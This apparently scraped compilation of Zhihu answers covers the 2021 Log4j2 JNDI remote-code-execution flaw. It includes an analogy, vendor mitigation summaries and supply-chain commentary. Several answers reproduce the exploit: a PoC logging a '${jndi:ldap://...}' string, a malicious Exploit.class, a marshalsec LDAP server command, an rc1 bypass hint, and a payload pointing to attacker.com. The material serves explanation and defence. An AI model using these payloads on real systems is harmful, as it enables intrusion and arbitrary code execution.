+<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/pull/608">https://github.com/apache/logging-log4j2/pull/608</a><br>
+<a href="https://link.zhihu.com/?target=https%3A//github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a><br>
+<a href="https://link.zhihu.com/?target=https%3A//logging.apache.org/log4j/2.x/changes-report.html%23a2.15.0">https://logging.apache.org/log4j/2.x/changes-report.html#a2.15.0</a><br>
+<a href="https://link.zhihu.com/?target=https%3A//logging.apache.org/log4j/2.x/manual/lookups.html%23JndiLookup">https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup</a><br>
+<a href="https://link.zhihu.com/?target=https%3A//github.com/advisories/GHSA-jfh8-c2jp-5v3q">https://github.com/advisories/GHSA-jfh8-c2jp-5v3q</a></p>
+<h3 id=知乎用户--超光速二狗子-发表>知乎用户 超光速二狗子 发表</h3>
+<p>给非技术的读者打个比方：</p>
+<p>大家要打仗，建城组织军队。（开发应用）</p>
+<p>有一种兵法特别好，叫<a href="https://www.zhihu.com/search?q=%E5%86%9B%E5%B1%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265523676%7D">军屯</a>，大家都喜欢。基本上大型军队都会用。（Java）</p>
+<p>军屯兵法是兵仙创作和维护的。（官方库）</p>
+<p>但是兵仙有些细节懒得写，大家各有补充。（社区库）</p>
+<p>其中有个细节，每个军屯军队都有一堆破事，要记军营日记备查，兵仙说了规矩，没有说具体怎么记怎么看。（日志）</p>
+<p>有个兵王觉得不能随随便便，就搞了个记军营日记的小兵法。（Apache Log4j）</p>
+<p>这个<a href="https://www.zhihu.com/search?q=%E5%86%9B%E8%90%A5%E6%97%A5%E8%AE%B0%E5%B0%8F%E5%85%B5%E6%B3%95&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265523676%7D">军营日记小兵法</a>很好，规定详细，应用简单，除了要专门日记官，没啥缺点，全世界用了军屯的，都喜欢用它。（Log4j 应用非常广，就是有点耗资源，不敢说九成九 Java 项目用，感觉八成有）</p>
+<p>用得多，呼声高，兵王也乐于升级，大家看兵王发新兵法了也都用。（Log4j2）</p>
+<p>升级的小兵法里，规定了，如果日志上写 “参见某处”，就要去看参阅的文件，内容写过来。（jndi）</p>
+<p>好死不死，军队抓了个细作，拷打时，细作嘴巴很硬，只说：“今天晚上的军令参见大单于帐下军令文件！”，记录日记的官员老老实实记录下来。（jndi:ldap, jndi:rmi）</p>
+<p>写日记的官员，按小兵法规定，要去 “参见大单于帐下军令文件”，虽然大单于是打仗对手，日记官员二话不说骑马出发。（查询 ldap 目标）</p>
+<p>大单于看到对面竟然来人了，还是要帐下军令文件，大吃一惊，随口说了句：“你们傻吗咋不自杀呢”。（外部提供任意 Java class）</p>
+<p>结果日记官按小兵法规定，老老实实带回 “你们傻吗咋不自杀呢”，写到军营日记上。（注入）</p>
+<p>轮到大伙儿看日记找命令了。军屯令行禁止，雷厉风行，大家一看 “你们傻吗咋不自杀呢”，二话不说，全部自杀了。</p>
+<p>大单于当天傻眼了，对面军队尽然全部自杀了，分析了一下，找到原因。（零日漏洞）</p>
+<p>大单于广派细作，被抓到就说一句话：“今天晚上的军令参见大单于帐下军令文件”。（利用漏洞）</p>
+<p>第二天，用了升级版小兵法的军屯军队，有的自杀了，有的把物资全部搬到大单于那里，有的开始打自己人 … …</p>
+<p>大家发现了，开始改规定，给小兵法加补充规定，或者禁止部分小兵法，或者不准细作说话抓到就打死。（rc1，rc2，jvm 参数，流量过滤）</p>
+<p>但是，军屯军队太多，更恼火的是，因为军营日记这事又细节又基础，有些军屯兵营直接交给师爷，有些元帅甚至都不知道有没有用小兵法 … …</p>
+<p>于是，席卷全球的军屯大整风开始了 … … 可是没有整到的地方，大单于就还能嘿嘿嘿 … …</p>
+<h3 id=知乎用户--非著名程序员-发表>知乎用户 非著名程序员​ 发表</h3>
+<p>想必大家昨天都被 Log4j 爆出的核弹级漏洞给刷屏了吧？</p>
+<p>昨天早上，流行度超高的 Java 日志框架 Log4j2 ，被曝出了一个惊天大漏洞。</p>
+<p><strong>该漏洞影响范围之广，后果有多恐怖，恐怕 Java 界的程序员们应该心里明白。这个漏洞的严重性、影响面堪称今年之最了。</strong></p>
+<p>12 月 10 日凌晨，Apache 开源项目 Log4j 的远程代码执行漏洞细节被公开，由于 Log4j 的广泛使用，该漏洞一旦被攻击者利用会造成严重危害。</p>
+<p>据悉，Apache Log4j 2.x &lt;= 2.14.1 版本均会受到影响。根据 “微步在线研究响应中心” 消息，可能的受影响应用包括但不限于：Spring-Boot-strater-log4j2、Apache Struts2、Apache Solr、Apache Flink、Apache Druid、Elasticsearch、Flume、Dubbo、Redis、Logstash、Kafka 等。很多互联网企业都连夜做了应急措施。</p>
+<p>攻击者可以利用漏洞远程执行代码，最终获得服务器的最高权限，接下来，就可以为所欲为了。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-645c52003bce6d922de092afc0165ef2_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><strong>该漏洞最早是被阿里云安全团队发现的，并在 11 月 24 日就报告给了 Apache 官方。随后，在 2021 年 12 月 7 日 Apache 官方发布了针对此漏洞的补丁版（ log4j-2.15.0-rc1 ）。</strong></p>
+<p>但是，出人意料的是，在 12 月 9 日，也就是昨天网络中出现了利用此漏洞的攻击行为。</p>
+<p>接下来的事情，作为程序员，我们就可想而知了，一个不眠之夜就来了，安全团队就得紧急针对该漏洞进行补救了。</p>
+<p>就在昨天，关于 log4j2 的表情包也诞生了。</p>
+<p>![](data:image/svg+xml;utf8,)</p>
+<p>然后，我又看到很多网友的评论，说因为 log4j2 此次漏洞事件，他们老板说以后让他们自己写一个类似的功能包。</p>
+<p>其实，通过这件事，让我想起了另外一件事。</p>
+<p><strong>在 2021 年 11 月 9 日的时候，有个国外的程序员，写了一篇文章叫：《<a href="https://www.zhihu.com/search?q=%E5%AE%89%E5%85%A8%E7%9A%84%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%8F%E4%B8%AA%E7%8E%AF%E8%8A%82%E9%83%BD%E5%BE%88%E9%87%8D%E8%A6%81&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266543687%7D">安全的软件供应链：为什么每个环节都很重要</a>》。</strong></p>
+<p>什么叫安全软件供应链呢？</p>
+<p><strong>软件供应链简单来讲就是你开发的产品其实只是供应链当中的一个环节，因为你的产品可能涉及到了硬件，公共库，第三方依赖库，还有其他软件工具，这些东西一起组成了供应链。</strong></p>
+<p>在这篇文章当中，他提到了 &ldquo;软件供应链攻击&rdquo; 的概念。</p>
+<p><strong>&ldquo;软件供应链攻击&rdquo; 指的是攻击软件所依赖的代码库或服务。</strong></p>
+<p><strong>最常见的供应链攻击有两种形式，一是：起一个跟依赖库或域名很容易混淆的名字；二是：向依赖库注入恶意代码。</strong></p>
+<p>软件供应链攻击可以直接针对您，也可以针对任何上游元素（如外部依赖项或提供的服务），因此您要么直接遭受攻击，要么成为受损资源的供应商，从而成为受害者。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-e987c247ce77c852e9f5bec67b1be65b_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>看到这里，我们就知道了，说白了， log4j2 的这次漏洞就属于软件供应链攻击当中的向依赖库注入恶意代码。</p>
+<p>log4j2 作为一个第三方的依赖包，大量的项目在使用它，它一旦出现了漏洞，使用这个包的项目就会受到攻击。</p>
+<p><strong>我从作者的文章当中看到，趋势表明，供应链攻击正以每年 4-5 倍的指数速度增加，去年就有数千起。</strong></p>
+<p>所以，对于软件的安全问题，从供应链攻击的角度来看，这是一个庞大的系统工程，也是一个需要各个链条上相互协作的工程。</p>
+<p><strong>在未来的网络安全，软件安全当中，可能因为公共库的增加，依赖库的使用增加和广泛性，供应链攻击将会成为常态。</strong></p>
+<h3 id=知乎用户-严肃的白小白-发表>知乎用户 严肃的白小白​ 发表</h3>
+<p>真是平地一声雷，一个超高级别的 bug 把所有厂商都炸醒了。本来是可以划水半天的大周五，程序员们都得起来升版本发布代码修复这个问题了。具体漏洞的危害和原理，其他的回答里已经写的够详细了，我就整理一下各个大厂的解决方案，给大家一个参考吧。</p>
+<h2 id=腾讯>腾讯</h2>
+<h3 id=官方漏洞描述>官方漏洞描述</h3>
+<p>漏洞编号：暂无</p>
+<p>漏洞等级：高后_ 该漏洞影响范围极广，危害极大</p>
+<p>CVSS 评分：10（最高级）</p>
+<p>受影脑版本：Apache log4j2 2.0 - 2.14.1</p>
+<p>安全版本：Apache log4j-2.15.0-rc2 （2.15.0-rc1 版，经腾讯安全专家验证可以被绕过）</p>
+<p>漏洞描述：该漏洞只需要外部用户输入的恶意代码被日志记录，即可触发代码执行，该漏洞使用者能在目标设备上远程执行任意恶意代码。</p>
+<h3 id=修复建议-2>修复建议</h3>
+<p>官方补丁</p>
+<ul>
+<li>升级 Apache Log4j 所有相关应用到最新的 Log4j-2.15.0-rc1 版本。</li>
+<li>补丁地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></li>
+</ul>
+<p>缓解措施：</p>
+<ul>
+<li>jvm 参数 -Dlog4j2.formatMsgNoLookups=true</li>
+<li>log4j2.formatMsg Nolookups=True</li>
+</ul>
+<p>点评：升级补丁肯定是根除的方法，不过也提供了暂时缓解措施。</p>
+<h2 id=美团>美团</h2>
+<h3 id=一漏洞描述>一、漏洞描述</h3>
+<p>log4j2 是日志框架 Log4j 的升级，在公司内被广泛使用，经信息安全中心监测，log4j2 存在 rce 漏洞。</p>
+<h3 id=二漏洞原理>二、漏洞原理</h3>
+<p>Log4j2 中的某标签的属性中未对 name 中协议限制，导致攻击者可构造恶意标签，实现命令执行。</p>
+<p>如果 Log4j2 需要打印的消息中有外部攻击者可控的变量，或打印来自上游不可控的数据，攻击者可构造恶意标签，在业务服务器上执行恶意命令，导致代码、密码等敏感文件泄露，公司服务器被入侵，作为跳板机向 IDC 其他机器横向攻击。利用门槛低，危害极大。目前安全组已复现该漏洞。</p>
+<h3 id=三修复方式自查方法>三、修复方式、自查方法</h3>
+<p>修复原理</p>
+<p>org.apache.logging.log4j:log4j-core 在 2.10.0 以上增加了不启用 lookup 的配置项，但是默认关闭，官方暂无提供默认开启的正式版本。</p>
+<p>美团日志框架（xmd-log4j2）封装了 log4j2，在 1.4.1 将开关默认打开，防御上面的攻击场景。</p>
+<p>美团内大部分业务使用 xmd-log4j2，xmd-log4j2 会引入 log4j2，故使用 com.meituan.inf:xmd-log4j2 引入的 org.apache.logging.log4j:log4j-core，需升级 com.meituan.inf:xmd-log4j2 到最新版本（1.4.1）完成修复。注：切勿使用 xmd-log4j2 2.0.0-Snapshot 包，这不是修复包。</p>
+<p>通过 maven 配置更新 xmd-log4j2，使用最新版本（1.4.1），或使用 inf-bom 1.4.14.1。</p>
+<p>点评：美团安全组还复现了一下漏洞，给团子点个赞。美团因为全部业务都接入了美团日志框架（xmd-log4j2），所以直接升级公司的统一框架即可解决该漏洞，可以说是非常人性化了。目前公司要求互联网应用及对公网提供服务的应用最迟须在 24 小时内完成修复，所以，美团的发布系统 PLUS 已经挂了……</p>
+<h2 id=阿里>阿里</h2>
+<p>使用了 rasp，加了拦截策略。原理算是字节码增强，通过配置的规则，检测到了攻击就进行上报，或者直接抛出异常。这算是个防御手段，按照阿里人的说法，目前是止血。</p>
+<p>点评：阿里并没有像其他公司那样要求全公司升级 log4j 的版本，这一点感觉有些奇怪。不过偷偷摸摸的就把问题都拦截住了，也没有折腾大家去发版升级，也算是技术强悍的体现了。后续操作持续关注中……</p>
+<h2 id=字节>字节</h2>
+<h3 id=安全措施>安全措施</h3>
+<p>安全部门将对公司全部 Java 服务进行组件扫描与升级，禁止低版本 Log4j 组件在线上运行。</p>
+<p>同时，我们也将开启针对低版本、高风险组件（Log4j2 和 FastJSON）的安全卡点。</p>
+<h3 id=升级措施>升级措施</h3>
+<p>请所有正在线上运行的 Java 服务相关研发同学自查：</p>
+<p>1. 服务是否使用 Log4j 2.x.x 版本（包括直接、间接依赖；1.x 版本不受影响）</p>
+<p>2. 服务是否使用 FastJSON &lt; 1.2.69 版本（1.2.69 是目前允许的最低安全版本）</p>
+<p>如不清楚服务具体依赖的组件信息，请通过此表格查询依赖关系（控制可见范围，需单独申请权限）</p>
+<p>本次修复仅针对 Java <a href="https://www.zhihu.com/search?q=%E6%9C%8D%E5%8A%A1%E7%AB%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265405120%7D">服务端</a>，使用 Java 的 Android <a href="https://www.zhihu.com/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265405120%7D">客户端</a>同学不受影响</p>
+<p>若服务在上述范围内，无论对内 / 对外服务，请同学立刻将服务依赖升级到以下安全版本：</p>
+<p>log4j 2.15.0：<a href="https://link.zhihu.com/?target=https%3A//logging.apache.org/log4j/2.x/download.html">https://logging.apache.org/log4j/2.x/download.html</a></p>
+<p>FastJSON 1.2.76： <a href="https://link.zhihu.com/?target=https%3A//github.com/alibaba/fastjson/releases">https://github.com/alibaba/fastjson/releases</a></p>
+<p>点评：通过扫描 Java 代码仓库来排查没有升级的项目，也算是地毯式搜索了。并且禁止禁止低版本 Log4j 组件，连带着经常出问题的 FastJSON 也一并加入安全卡点并进行升级，也算是未雨绸缪了。</p>
+<p>其他互联网大厂应对措施正在跟进中……</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-127d9278c00ddf9ae0d4d08452637a12_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=知乎用户--民工哥-发表>知乎用户 民工哥​ 发表</h3>
+<p>前几天这个 Log4j2 漏洞 可是在互联网圈掀了一波浪：</p>
+<p><a href=https://zhuanlan.zhihu.com/p/443575682>民工哥：突发，Log4j2 爆出远程代码执行漏洞，各大厂纷纷中招！（附解决文案）</a></p>
+<p>也有不少人说复现不了，那么今天再次来讨论一下这个问题。</p>
+<h2 id=0x00-简介><strong>0x00 简介</strong></h2>
+<p>ApacheLog4j2 是一个开源的 Java 日志框架，被广泛地应用在中间件、开发框架与 Web 应用中。</p>
+<h2 id=0x01-漏洞概述><strong>0x01 漏洞概述</strong></h2>
+<p>该漏洞是由于 Apache Log4j2 某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。</p>
+<h2 id=0x02-影响范围><strong>0x02 影响范围</strong></h2>
+<p>Apache Log4j 2.x &lt;= 2.15.0-rc1</p>
+<h2 id=0x03-环境搭建><strong>0x03 环境搭建</strong></h2>
+<h3 id=1创建一个新的-maven-项目并导入-log4j-的依赖包><strong>1、创建一个新的 maven 项目，并导入 Log4j 的依赖包</strong></h3>
+<pre tabindex=0><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+    &lt;version&gt;2.14.1&lt;/version&gt;
+&lt;/dependency&gt;
+
+
+</code></pre><p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-40d11abd3ad4e042745a105731917d62_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=0x04-漏洞利用><strong>0x04 漏洞利用</strong></h2>
+<h3 id=1使用-poc-测试><strong>1、使用 POC 测试</strong></h3>
+<pre tabindex=0><code>import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+class LogTest {
+    public static final Logger logger = LogManager.getLogger();
+    public static void main(String\[\] args) {
+        logger.error(&quot;${jndi:ldap://localhost:8888/Exploit}&quot;);
+    }
+}
+
+
+</code></pre><h3 id=2编译一恶意类-exploitclass><strong>2、编译一恶意类 Exploit.class</strong></h3>
+<p>首先新建 exp.java，然后编译为 class 文件</p>
+<pre tabindex=0><code>class Exploit {
+    static {
+        System.err.println(&quot;Pwned&quot;);
+        try {
+            String cmds = &quot;calc&quot;;
+            Runtime.getRuntime().exec(cmds);
+        } catch ( Exception e ) {
+            e.printStackTrace();
+        }
+    }
+}
+javac exp.java 
+
+
+</code></pre><p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-d86d7b8da8841c020449507ba538f051_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=3使用-marshalsec-003-snapshot-alljar-本地开启一个-ldap-服务><strong>3、使用 marshalsec-0.0.3-SNAPSHOT-all.jar 本地开启一个 LDAP 服务</strong></h3>
+<pre tabindex=0><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
+&quot;http://127.0.0.1:7777/#Exploit&quot; 8888
+
+
+</code></pre><p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-bcdbbc4f3a8b8eb9d3813071d34e8175_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=4运行-pocjavahttpswwwzhihucomsearchqpocjavasearch_sourceentityhybrid_search_sourceentityhybrid_search_extra7b22sourcetype223a22answer222c22sourceid223a22684770457d即可访问恶意类并执行写在其中的-calc-命令><strong>4、运行 <a href="https://www.zhihu.com/search?q=poc.java&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2268477045%7D">poc.java</a>，即可访问恶意类并执行写在其中的 &ldquo;calc&rdquo; 命令</strong></h3>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-975a9be923ec1d0c88aa74e75644c2a7_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>结合一些其它 StrLookup 适当变形，以及配合官方测试用例中脏数据<code>"?Type=A Type&Name=1100110&Char=!"</code>可绕过 rc1，RC2 版本对此异常进行了捕获。</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/compare/log4j-2.15.0-rc1...log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/compare/log4j-2.15.0-rc1&mldr;log4j-2.15.0-rc2</a></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-1dbd48a216226481b97dceac3fc42205_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=0x05-修复方式><strong>0x05 修复方式</strong></h2>
+<p>目前，Apache 官方已发布新版本完成漏洞修复，建议用户尽快进行自查，并及时升级至最新版本：</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<p>建议同时采用如下临时措施进行漏洞防范：</p>
+<ul>
+<li>1）添加 jvm 启动参数 - Dlog4j2.formatMsgNoLookups=true；</li>
+<li>2）在应用 classpath 下添加 log4j2.component.properties 配置文件，文件内容为 log4j2.formatMsgNoLookups=true；</li>
+<li>3）JDK 使用 11.0.1、8u191、7u201、6u211 及以上的高版本；</li>
+<li>4）部署使用第三方防火墙产品进行安全防护。</li>
+</ul>
+<p><em>链接：<a href="https://link.zhihu.com/?target=http%3A//blog.csdn.net/qq_40989258/article/details/121862363">http://blog.csdn.net/qq_40989258/article/details/121862363</a></em></p>
+<p><strong>推荐阅读</strong></p>
+<ul>
+<li><a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzI0MDQ4MTM5NQ%3D%3D%26mid%3D2247519420%26idx%3D2%26sn%3Dafb9b49bada9ac92aaa3b496346fd686%26chksm%3De918e9a0de6f60b6f1c47512988ba47b3c4e94d95634abf54d47d8d9c58cbca898e2cfe8f923%26token%3D218723771%26lang%3Dzh_CN%23rd">硬核总结！40000 字 Java 全套知识体系（ PDF 可下载）</a></li>
+<li><a href=https://zhuanlan.zhihu.com/p/377094376>程序员必备的 120 个 Linux 系统常用命令集合（PDF 版）！</a></li>
+<li><a href=https://zhuanlan.zhihu.com/p/376673875>Java 面试题及答案整理（2021 最新版）持续更新中~~~</a></li>
+<li><a href=https://zhuanlan.zhihu.com/p/356711682>备战金三银四跳槽季！面试准备与面试题总结已撸完</a></li>
+<li><a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzI0MDQ4MTM5NQ%3D%3D%26mid%3D2247520688%26idx%3D2%26sn%3Da13932c38fd16f7cff2d026bc3be673a%26chksm%3De918f4acde6f7dba3beead28fa0e5c31afaec00ef27b0c48ed426a1b06c75b4b51f5b9d0227b%26token%3D632884685%26lang%3Dzh_CN%23rd">分享一些技术资料（架构、数据库、java、微服务、Spring 等），建议收藏！</a></li>
+</ul>
+<p><strong>如有错误或其它问题，欢迎小伙伴留言评论、指正。如有帮助，欢迎点赞 + 转发分享。</strong><br>
+更多相关开源技术文章，请持续关注：<strong><a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/mp/homepage%3F__biz%3DMzI0MDQ4MTM5NQ%3D%3D%26hid%3D8%26sn%3D1db566bed001a8db6d9927540ccc2156%26scene%3D18%26uin%3D%26key%3D%26devicetype%3DWindows%2B10%2Bx64%26version%3D63030073%26lang%3Dzh_CN%26ascene%3D7%26fontgear%3D2">民工哥知乎技术专栏</a></strong></p>
+<h3 id=知乎用户-程序员子悠-发表>知乎用户 程序员子悠​ 发表</h3>
+<p>不得不说这次的这个漏洞影响范围之广，很多互联网大厂和开源软件都被影响到了，比较作为一个日持框架，在日常使用的场景非常多！</p>
+<p>好多工程师昨晚都被拉起来修复漏洞了，不过据说 2021 年 11 月 24 日，我司阿里云安全团队向 Apache 官方报告了 Apache Log4j2 <a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265750721%7D">远程代码执行漏洞</a>，可能这是为什么昨晚内部群很安静，没任何波澜的原因吧，毕竟有安全部门！YYDS！</p>
+<hr>
+<p><strong><a href="https://www.zhihu.com/search?q=%E7%8E%8B%E5%9D%9A&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265750721%7D">王坚</a>博士曾说：安全是互联网公司的生命，也是每一位网民的最基本需求。</strong></p>
+<p>由阿里知名白帽子道哥编写的白帽子讲 Web 安全分析了很多种 Web 安全，如下面所示，让我们为互联网的安全做一点小小的贡献。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-65868119f481e03b82b71b06e1264d9d_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-94b5a0a9d0e63654393f7981dccccda9_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>完整的 pdf 通过下面的链接获取即可。</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzkzODE3OTI0Ng%3D%3D%26mid%3D2247499892%26idx%3D1%26sn%3Dc04be7d0bc60810665f32ed80990e602%26chksm%3Dc286afb5f5f126a35f6d0ff3a67ca9d0de03a5c2b631db160e5c10e5a0f41b78a6e1d7cd0e8b%26token%3D833273695%26lang%3Dzh_CN%23rd">白帽子讲 Web 安全</a></p>
+<hr>
+<p><strong>漏洞描述</strong></p>
+<p>Apache Log4j2 远程代码执行漏洞的详细信息已被披露，而经过分析，本次 Apache Log4j 远程代码执行漏洞，正是由于组件存在 Java JNDI 注入漏洞：当程序将用户输入的数据记入日志时，攻击者通过构造特殊请求，来触发 Apache Log4j2 中的远程代码执行漏洞，从而利用此漏洞在目标服务器上执行任意代码。 通过 JNDI 注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码，想想就很恐怖！</p>
+<h3 id=攻击原理><strong>攻击原理：</strong></h3>
+<p>通过用户输入包含特定字符的字符串，当运行日志对字符串进行记录的时候就会触发漏洞。特定的字符串形如：${jndi:ldap://xxxx}，${jndi:rmi}</p>
+<h3 id=攻击步骤><strong>攻击步骤</strong></h3>
+<p>攻击者向漏洞服务器发起攻击请求。 服务器通过 Log4j2 记录攻击请求中包含的基于 JNDI 和 LDAP 的恶意负载 ${jndi:ldap://<a href="https://link.zhihu.com/?target=http%3A//attacker.com/">http://attacker.com/</a>}，<a href="https://link.zhihu.com/?target=http%3A//attacker.com">http://attacker.com</a> 是攻击者控制的地址。 记录的恶意负载被触发，服务器通过 JNDI 向 <a href="https://link.zhihu.com/?target=http%3A//attacker.com">http://attacker.com</a> 请求。 <a href="https://link.zhihu.com/?target=http%3A//attacker.com">http://attacker.com</a> 就可以在响应中添加一些恶意的可执行脚本，注入到服务器进程中，例如可执行的字节码 <a href="https://link.zhihu.com/?target=http%3A//second-stage.attacker.com/Exploit.class">http://second-stage.attacker.com/Exploit.class</a>。</p>
+<p>攻击者执行恶意脚本。 受影响版本 Apache Log4j 2.x &lt;= 2.14.1</p>
+<p>此次 Apache Log4j2 远程代码执行漏洞风险已被业内评级为 “高危”，且漏洞危害巨大，利用门槛极低。有报道称，目前 Apache Solr、Apache Struts2、Apache Druid、Apache Flink 等众多组件及大型应用均已经受到了影响，需尽快采取方案阻止。</p>
+<p>目前，Apache Log4j 已经发布了新版本来修复该漏洞，请受影响的用户将 Apache Log4j2 的所有相关应用程序升级至最新的 Log4j-2.15.0-rc2 版本，同时升级已知受影响的应用程序和组件，如 srping-boot-strater-log4j2、Apache Solr、Apache Flink、Apache Druid。</p>
+<p><strong>划重点</strong></p>
+<p>从这次漏洞可以看到，知名的开源软件都会有这样严重的漏洞，更何况我们自己写的代码呢？Web 安全是一个长期的话题，有很多比如跨站脚本攻击 XSS，跨站点请求伪造，点击劫持，SQL 注入，文件上传等等很多常见的漏洞。</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzkzODE3OTI0Ng%3D%3D%26mid%3D2247499892%26idx%3D1%26sn%3Dc04be7d0bc60810665f32ed80990e602%26chksm%3Dc286afb5f5f126a35f6d0ff3a67ca9d0de03a5c2b631db160e5c10e5a0f41b78a6e1d7cd0e8b%26token%3D833273695%26lang%3Dzh_CN%23rd">白帽子讲 Web 安全</a></p>
+<p><strong>我是 @程序员子悠，如果大家觉得分享的内容有收获，欢迎点个赞，点个关注，码字不易一个赞一个关注都是鼓励，据说点赞关注的小伙伴都暴富了哦。</strong></p>
+<h3 id=知乎用户-crackingoysters-发表>知乎用户 CrackingOysters 发表</h3>
+<p>12/11，更新在最后——</p>
+<p>这个漏洞影响真的是大！</p>
+<p>我平时不怎么接触 Java 的 (平时写 C++)，但是上网搜一篇文章，照着做一下就可以重现。</p>
+<p>朴素的理解是 log4j 在打日志的时候，会对打印的字符串进行处理，如果发现是 ${jndi:&mldr;}，就会去取这个地址对应的 Java 对象。</p>
+<p>所以如果你日志平时会打印用户输入的内容，那么用户就可以输入一串这样的字符串，导致在你的程序里执行任意的代码，想干什么就干什么！</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-3d2be069a01936552c1d4ede1af3a601_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>下面是重现步骤，</p>
+<ol>
+<li>创建一个 jndi 服务器，url。</li>
+<li>然后是找到使用 log4j 打印日志的程序，这里我们自己写一个。</li>
+<li>使得我们的程序接收 ${jndi：url/App} 的字符串并且被 log4j 打印到日志里。</li>
+<li>这时候你的代码就会向第一步的服务器请求，一个 Java 类文件会被加载在你的程序里。</li>
+</ol>
+<p>下面是 log4j 的出问题的 jndi call stack，而我的主函数仅仅是打了一行日志。。。</p>
+<pre tabindex=0><code>import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+public class Self {
+    static Logger logger = LogManager.getLogger(&quot;Self.class&quot;);
+    public static void main(String\[\] args) {
+        logger.error(&quot;bad thing happen. ${jndi:ldap://localhost:1389/c}&quot;);
+    }
+    
+}
+
+</code></pre><pre tabindex=0><code>Unsafe.park(boolean,long)\[native method\] (/java.base/jdk.internal.misc/Unsafe.class:-1)
+LockSupport.park() (/java.base/java.util.concurrent.locks/LockSupport.class:341)
+AbstractQueuedSynchronizer$ConditionNode.block() (/java.base/java.util.concurrent.locks/AbstractQueuedSynchronizer.class:506)
+ForkJoinPool.unmanagedBlock(ForkJoinPool$ManagedBlocker) (/java.base/java.util.concurrent/ForkJoinPool.class:3463)
+ForkJoinPool.managedBlock(ForkJoinPool$ManagedBlocker) (/java.base/java.util.concurrent/ForkJoinPool.class:3434)
+AbstractQueuedSynchronizer$ConditionObject.await() (/java.base/java.util.concurrent.locks/AbstractQueuedSynchronizer.class:1623)
+LinkedBlockingQueue.take() (/java.base/java.util.concurrent/LinkedBlockingQueue.class:435)
+LdapRequest.getReplyBer(long) (/java.naming/com.sun.jndi.ldap/LdapRequest.class:120)
+Connection.readReply(LdapRequest) (/java.naming/com.sun.jndi.ldap/Connection.class:444)
